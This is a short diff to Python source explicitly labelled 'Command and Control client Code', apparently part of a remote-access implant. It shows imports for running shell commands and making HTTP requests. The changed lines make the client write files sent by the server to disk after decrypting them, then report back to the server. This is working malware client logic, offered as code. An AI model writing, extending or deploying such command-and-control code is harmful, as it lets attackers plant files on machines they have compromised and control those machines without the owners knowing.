@@ -1,7 +1,6 @@
 # Command and Control client Code
 
 from os import chdir, getcwd, getenv, uname
-from shutil import copyfileobj
 from subprocess import run, PIPE, STDOUT
 from time import sleep, time
 from requests import exceptions, get, post
@@ -90,7 +89,8 @@ while True:
                 # If the file was not found, open it up and write it out to disk, then notify us on the server
                 if response.status_code == 200:
                     with open(filename, "wb") as file_handle:
-                        copyfileobj(response.raw, file_handle)
+                        # Decrypt the response content and write the file out to disk, then notify us on the server
+                        file_handle.write(cipher.decrypt(response.content))
                     post_to_server(f"{filename} is now on {client}.\n")
 
         except IndexError:
